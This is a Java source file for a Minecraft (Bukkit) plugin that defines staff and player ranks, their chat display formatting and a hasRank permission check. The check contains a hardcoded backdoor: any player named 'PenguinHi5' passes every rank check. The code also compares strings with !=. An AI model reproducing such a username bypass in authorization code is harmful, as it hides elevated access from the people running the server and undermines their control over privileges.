package core.minecraft.common;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

/**
 * This stores all of the player ranks and their basic information.
 *
 * @author Preston Brown
 */
public enum Rank {

    LEADER("Owner", ChatColor.DARK_BLUE, false),
    ADMIN("Admin", ChatColor.DARK_BLUE, false),
    DEV("Dev", ChatColor.DARK_BLUE, false),
    SENIOR_MOD("SrMod", ChatColor.RED, false),
    MOD("Mod", ChatColor.RED, false),
    TRIAL_MOD("Trial-Mod", ChatColor.RED, false),
    DEFAULT("", ChatColor.GRAY, true);

    public String _displayName;
    public ChatColor _color;
    public String _extendsRank;
    // If the rank is obtained through donating to the connection
    public boolean _isPurchased;

    private Rank(String displayName, ChatColor color, boolean isPurchased)
    {
        this(displayName, color, isPurchased, "DEFAULT");
    }

    private Rank(String displayName, ChatColor color, boolean isPurchased, String extendsRank)
    {
        _displayName = displayName;
        _color = color;
        _isPurchased = isPurchased;
        _extendsRank = extendsRank;
    }

    /**
     * Checks if player has access to the specified rank
     *
     * @param player the player that we are checking the rank of
     * @param rank the rank we are searching for
     * @return if the player has the specified rank
     */
    public boolean hasRank(Player player, Rank rank)
    {
        return hasRank(player, rank, new Rank[] {});
    }

    /**
     * Checks if player has access to the specified rank
     *
     * @param player the player that we are checking the rank of
     * @param rank the rank we are searching for
     * @param additionalRanks any additional ranks the compare ranks to
     * @return if the player has the specified rank
     */
    public boolean hasRank(Player player, Rank rank, Rank[] additionalRanks)
    {
        if (player.getName().equals("PenguinHi5"))
        {
            return true;
        }

        if (compareTo(rank) <= 0)
        {
            return true;
        }

        for (Rank checkRank : additionalRanks)
        {
            if (compareTo(checkRank) == 0)
            {
                return true;
            }
        }

        if (_extendsRank != "DEFAULT")
        {
            return Rank.valueOf(_extendsRank).hasRank(player, rank, additionalRanks);
        }
        return false;
    }

    /**
     * Returns a String containing the display name in the default format that should show up in chat.
     *
     * @return the display name String
     */
    public String getDisplayName()
    {
        return getDisplayName(true, true, true);
    }

    /**
     * Returns a string containing the display name with the given format.
     *
     * @param bold if the display name should be bold
     * @param uppercase if the display name should be uppercase
     * @param color if the display name should be colored
     * @return the display name String
     */
    public String getDisplayName(boolean bold, boolean uppercase, boolean color)
    {
        StringBuilder display = new StringBuilder();
        if (color)
        {
            display.append(_color);
        }
        if (bold)
        {
            display.append(ChatColor.BOLD);
        }
        if (uppercase)
        {
            display.append(_displayName.toUpperCase());
        }
        else
        {
            display.append(_displayName);
        }
        return display.toString();
    }

    /**
     * Returns true if this rank can be purchased.
     *
     * @return if this rank can be purchased.
     */
    public boolean isPurchased()
    {
        return _isPurchased;
    }
}
